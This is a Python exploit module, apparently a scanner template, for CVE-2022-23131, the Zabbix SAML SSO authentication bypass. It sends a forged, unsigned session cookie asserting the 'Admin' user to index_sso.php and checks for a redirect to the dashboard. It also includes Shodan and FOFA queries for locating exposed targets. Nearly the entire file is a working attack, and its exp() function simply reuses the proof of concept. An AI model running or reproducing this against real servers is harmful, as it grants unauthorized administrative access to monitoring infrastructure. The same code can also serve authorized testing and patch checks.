import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Zabbix - SAML SSO Authentication Bypass''',
        "description": '''When SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor because a user login stored in the session was not verified.''',
        "severity": "critical",
        "references": [
            "https://support.zabbix.com/browse/ZBX-20350", 
            "https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23131", 
            "https://github.com/1mxml/CVE-2022-23131"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cvss-score": "9.8",
            "cve-id": "CVE-2022-23131",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.favicon.hash:892542951''',
            "fofa-query":'''app="ZABBIX-监控系统" && body="saml"'''
        },
        "tags": ["cve", "cve2022", "zabbix", "auth-bypass", "saml", "sso"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        headers = {
            "Cookie": "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
        }
        paths = [
            "/zabbix/index_sso.php",
            "/index_sso.php"
        ]

        for path in paths:
            resp = requests.get(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
            if resp.status_code == 302 and "location: zabbix.php?action=dashboard.view" in str(resp.headers).lower():
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url